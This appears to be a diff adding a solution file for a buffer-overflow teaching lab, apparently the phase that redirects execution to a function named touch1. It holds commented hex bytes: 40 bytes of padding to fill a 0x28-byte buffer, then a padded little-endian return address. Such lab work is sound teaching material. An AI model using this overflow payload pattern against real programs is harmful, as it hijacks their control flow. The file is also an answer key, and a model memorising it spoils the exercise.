@@ -1,0 +1,5 @@
+/* Padding 40 bytes or buffer length 0x28 in hexadecimal */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
+/* touch1 address padded */
+da 14 40 00 00 00 00 00 00 00 00 00 00
